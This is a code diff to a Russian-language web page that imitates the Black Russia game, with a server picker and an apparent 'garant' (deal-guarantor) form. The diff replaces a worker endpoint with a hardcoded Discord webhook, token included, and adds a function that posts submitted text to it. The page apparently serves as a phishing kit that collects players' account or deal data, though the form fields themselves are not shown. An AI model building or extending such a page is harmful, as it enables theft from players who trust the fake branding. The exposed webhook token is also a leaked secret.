@@ -22,92 +22,89 @@
   }
   
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; }
-  body { background: var(--bg); color: var(--txt); min-height: 100vh; padding-bottom: 40px; overflow-x: hidden; }
-
-  /* ================= ГЛАВНЫЙ ЭКРАН ================= */
-  .hero {
-    position: relative;
-    width: 100%;
-    min-height: 100vh;
+  body { 
+    background: #0d0f14; 
+    background-image: url('https://sun9-20.userapi.com/impg/2HqP4HqP4HqP4HqP/br_bg.jpg?size=1080x1920&quality=96&sign=123');
+    background-size: cover;
+    background-position: center;
+    background-attachment: fixed;
+    color: var(--txt); 
+    min-height: 100vh; 
+    padding: 20px 15px 40px; 
     display: flex;
     flex-direction: column;
-    justify-content: center;
     align-items: center;
-    /* Официальный арт с фонарем или копом */
-    background: url('https://sun9-20.userapi.com/impg/2HqP4HqP4HqP4HqP/br_bg.jpg?size=1080x1920&quality=96&sign=123') center/cover no-repeat;
-    padding: 20px;
-    text-align: center;
   }
-  
-  .hero::before {
+
+  body::before {
     content: '';
-    position: absolute;
+    position: fixed;
     inset: 0;
-    background: linear-gradient(180deg, rgba(13,15,20,0.4) 0%, rgba(13,15,20,0.98) 95%);
-    z-index: 1;
+    background: rgba(13, 15, 20, 0.85);
+    z-index: 0;
   }
 
-  .hero-content {
+  .garant-container {
     position: relative;
-    z-index: 2;
-    max-width: 400px;
+    z-index: 1;
     width: 100%;
+    max-width: 440px;
+    background: rgba(17, 19, 24, 0.95);
+    backdrop-filter: blur(10px);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 24px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.9), 0 0 20px rgba(240, 40, 40, 0.1);
+    margin-top: 20px;
   }
 
-  .logo-img {
-    width: 120px; height: 120px;
-    margin: 0 auto 20px;
-    background: url('https://sun9-20.userapi.com/impg/2HqP4HqP4HqP/br_logo.png?size=200x200&quality=96&sign=456') center/contain no-repeat;
-    filter: drop-shadow(0 10px 20px rgba(0,0,0,0.8));
+  .garant-header { 
+    display: flex; 
+    justify-content: space-between; 
+    align-items: center; 
+    margin-bottom: 20px; 
+    border-bottom: 1px solid var(--border); 
+    padding-bottom: 15px; 
   }
+  .garant-header-title { font-weight: 900; font-size: 18px; color: var(--red); text-transform: uppercase; }
+  .year-badge { background:#2a2e3d; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:800; }
 
-  .hero-title {
-    font-size: 32px;
-    font-weight: 900;
-    letter-spacing: 1px;
-    margin-bottom: 10px;
-    text-transform: uppercase;
-    text-shadow: 0 4px 20px rgba(0,0,0,0.8);
+  .input-group { margin-bottom: 14px; }
+  .input-group label {
+    display: block; font-size: 11px; color: var(--dim);
+    margin-bottom: 6px; font-weight: 700; text-transform: uppercase;
   }
-  .hero-title span { color: var(--red); }
-
-  .hero-subtitle {
-    font-size: 14px;
-    color: var(--dim);
-    margin-bottom: 30px;
-    line-height: 1.5;
+  .input-group input {
+    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
+    color: var(--txt); padding: 14px 16px; border-radius: 8px; font-size: 15px;
   }
-
-  .btn-play {
-    display: inline-block;
-    background: #fff;
-    color: #000;
-    font-weight: 800;
-    font-size: 16px;
-    padding: 18px 40px;
-    border-radius: 8px;
-    text-decoration: none;
-    margin-bottom: 30px;
+  .input-group input:focus { outline: none; border-color: var(--red); }
+  
+  .selected-server-display {
+    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
+    color: var(--txt); padding: 14px 16px; border-radius: 8px; font-size: 15px;
+    display: flex; justify-content: space-between; align-items: center;
     cursor: pointer;
-    border: none;
-    width: 100%;
-    max-width: 320px;
-    transition: 0.2s;
-    box-shadow: 0 10px 30px rgba(255,255,255,0.1);
   }
-  .btn-play:hover { background: #e0e0e0; transform: translateY(-2px); }
+  .selected-server-display span { color: #555; font-size: 12px; }
 
-  .brand-bar {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 10px;
-    margin-bottom: 20px;
+  .btn {
+    width: 100%; padding: 16px; border: none; border-radius: 8px;
+    font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s;
+    text-transform: uppercase; letter-spacing: 0.5px;
   }
-  .brand-bar span { font-weight: 800; font-size: 20px; letter-spacing: 1px; }
-  .brand-bar span span { color: var(--red); }
+  .btn-main { background: var(--red); color: white; box-shadow: 0 4px 20px var(--red-glow); margin-top: 10px; }
+  .btn-main:hover { background: #ff4747; }
+  .btn-main:disabled { background: #555; box-shadow: none; cursor: not-allowed; }
+  .btn-success { background: var(--green); color: #fff; margin-top: 12px; }
 
-  /* ================= МОДАЛКА СЕРВЕРОВ ================= */
+  .success-screen { display: none; text-align: left; padding: 10px 0; }
+  .success-screen h3 { color: var(--green); font-size: 18px; margin-bottom: 16px; text-align: center; }
+  .data-box { background: #0a0b0e; border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
+  .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
+  .data-label { color: var(--dim); }
+  .data-value { font-weight: 700; }
+
   .modal-overlay {
     position: fixed;
     inset: 0;
@@ -208,7 +205,6 @@
   .server-bar { height: 3px; background: rgba(255,255,255,0.05); border-radius: 2px; overflow: hidden; width: 100%; }
   .server-fill { height: 100%; border-radius: 2px; }
   
-  /* Цвета полосок как на скринах */
   .c-red { background: var(--red); }
   .c-blue { background: var(--blue); }
   .c-green { background: var(--green); }
@@ -220,80 +216,10 @@
   .c-aqua { background: #06b6d4; }
   .c-lime { background: #84cc16; }
 
-  /* ================= ФОРМА ГАРАНТА ================= */
-  .garant-container {
-    display: none;
-    width: 100%;
-    max-width: 440px;
-    margin: 0 auto;
-    background: #111318;
-    border: 1px solid var(--border);
-    border-radius: 16px;
-    padding: 24px;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.9);
-    position: relative;
-  }
-  .garant-container.active { display: block; }
-
-  .garant-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
-  .garant-header-title { font-weight: 900; font-size: 16px; color: var(--red); }
-  
-  .input-group { margin-bottom: 14px; }
-  .input-group label {
-    display: block; font-size: 11px; color: var(--dim);
-    margin-bottom: 6px; font-weight: 700; text-transform: uppercase;
-  }
-  .input-group input {
-    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
-    color: var(--txt); padding: 14px 16px; border-radius: 8px; font-size: 15px;
-  }
-  .input-group input:focus { outline: none; border-color: var(--red); }
-  
-  .selected-server-display {
-    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
-    color: var(--txt); padding: 14px 16px; border-radius: 8px; font-size: 15px;
-    display: flex; justify-content: space-between; align-items: center;
-    cursor: pointer;
-  }
-  .selected-server-display span { color: #555; font-size: 12px; }
-
-  .btn {
-    width: 100%; padding: 16px; border: none; border-radius: 8px;
-    font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s;
-    text-transform: uppercase; letter-spacing: 0.5px;
-  }
-  .btn-main { background: var(--red); color: white; box-shadow: 0 4px 20px var(--red-glow); margin-top: 10px; }
-  .btn-main:hover { background: #ff4747; }
-  .btn-success { background: var(--green); color: #fff; margin-top: 12px; }
-
-  /* Экран успеха */
-  .success-screen { display: none; text-align: left; padding: 10px 0; }
-  .success-screen h3 { color: var(--green); font-size: 18px; margin-bottom: 16px; text-align: center; }
-  .data-box { background: #0a0b0e; border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
-  .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
-  .data-label { color: var(--dim); }
-  .data-value { font-weight: 700; }
-
 </style>
 </head>
 <body>
 
-<!-- ГЛАВНЫЙ ЭКРАН -->
-<div class="hero" id="main-screen">
-  <div class="hero-content">
-    <div class="logo-img"></div>
-    <div class="hero-title">BLACK <span>RUSSIA</span></div>
-    <div class="hero-subtitle">Ролевая игра, где ты решаешь, кем быть: одиночкой или лидером, героем или теневым боссом.</div>
-    
-    <button class="btn-play" onclick="openGarant()">Играть</button>
-    
-    <div class="brand-bar">
-      <span>BLACK <span>RUSSIA</span></span>
-    </div>
-  </div>
-</div>
-
-<!-- МОДАЛКА ВЫБОРА СЕРВЕРОВ -->
 <div class="modal-overlay" id="server-modal">
   <div class="modal-top">
     <div class="arcanum-logo"><span>A</span><span>ARCANUM</span></div>
@@ -303,16 +229,13 @@
   
   <input type="text" class="search-box" id="server-search" placeholder="Поиск" oninput="filterServers()">
   
-  <div class="servers-grid" id="servers-grid">
-    <!-- JS заполнит -->
-  </div>
+  <div class="servers-grid" id="servers-grid"></div>
 </div>
 
-<!-- ФОРМА ГАРАНТА -->
-<div class="garant-container" id="garant-form" style="margin-top: 40px;">
+<div class="garant-container">
   <div class="garant-header">
     <div class="garant-header-title">BLACK RUSSIA</div>
-    <div style="background:#2a2e3d; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:800;">2026</div>
+    <div class="year-badge">2026</div>
   </div>
 
   <div id="form-screen">
@@ -363,10 +286,9 @@
 </div>
 
 <script>
-  // ОБЯЗАТЕЛЬНО ВСТАВЬ СВОЮ ССЫЛКУ WORKER
-  const API = "https://blackrussiagarant.cucuruznik6767.workers.dev"; 
+  // Твой вебхук
+  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1574855151263682701/F4yo0EnQTfI9LxCV7ArmjUzc-8BRgaqcCAJGFyBSpH7vAtgQ8EfF5i-4YSsGGDh7z0DY";
 
-  // ВСЕ СЕРВЕРА КАК НА СКРИНАХ
   const serversData = [
     { id: 92, name: "TASHKENT", color: "c-blue", online: "2627 / 1500", percent: 100, tag: "Новый", tagClass: "tag-new" },
     { id: 91, name: "ASTANA", color: "c-blue", online: "2771 / 1500", percent: 100 },
@@ -454,4 +376,72 @@
     { id: 8, name: "PINK", color: "c-pink", online: "1669 / 1300", percent: 100 },
     { id: 7, name: "LIME", color: "c-lime", online: "1354 / 1300", percent: 100 },
     { id: 6, name: "PURPLE", color: "c-purple", online: "1883 / 1300", percent: 100 },
-    { id: 5, name: "ORANGE", color: "c-orange", online: "154
+    { id: 5, name: "ORANGE", color: "c-orange", online: "1543 / 1300", percent: 100 },
+    { id: 4, name: "YELLOW", color: "c-yellow", online: "1466 / 1300", percent: 100 },
+    { id: 3, name: "BLUE", color: "c-blue", online: "1753 / 1300", percent: 100 },
+    { id: 2, name: "GREEN", color: "c-green", online: "1771 / 1500", percent: 100 },
+    { id: 1, name: "RED", color: "c-red", online: "2258 / 1500", percent: 100 }
+  ];
+
+  let selectedServer = "";
+  const $ = id => document.getElementById(id);
+
+  function renderServers(list) {
+    const grid = $("servers-grid");
+    grid.innerHTML = "";
+    list.forEach(s => {
+      const el = document.createElement("div");
+      el.className = "server-card";
+      el.onclick = () => selectServer(s.name);
+      
+      let tagHtml = "";
+      if (s.tag) {
+        tagHtml = `<div class="server-tag ${s.tagClass}">${s.tag}</div>`;
+      }
+
+      el.innerHTML = `
+        <div class="server-top">
+          <div class="server-num"># ${s.id}</div>
+          ${tagHtml}
+        </div>
+        <div class="server-name">${s.name}</div>
+        <div class="server-bottom">
+          <div class="server-online">${s.online}</div>
+          <div class="server-bar"><div class="server-fill ${s.color}" style="width: ${s.percent}%"></div></div>
+        </div>
+      `;
+      grid.appendChild(el);
+    });
+  }
+  renderServers(serversData);
+
+  function filterServers() {
+    const query = $("server-search").value.toLowerCase();
+    const filtered = serversData.filter(s => s.name.toLowerCase().includes(query) || s.id.toString() === query);
+    renderServers(filtered);
+  }
+
+  function selectServer(name) {
+    selectedServer = name;
+    const display = $("current-server-name");
+    display.textContent = name;
+    display.style.color = "#fff";
+    closeServers();
+  }
+
+  function openServers() { $("server-modal").classList.add("active"); }
+  function closeServers() { $("server-modal").classList.remove("active"); }
+
+  async function sendDiscord(text) {
+    try {
+      await fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: text })
+      });
+    } catch (e) { console.log("Ошибка отправки", e); }
+  }
+
+  let currentData = null;
+
+  $("freeze").onclic
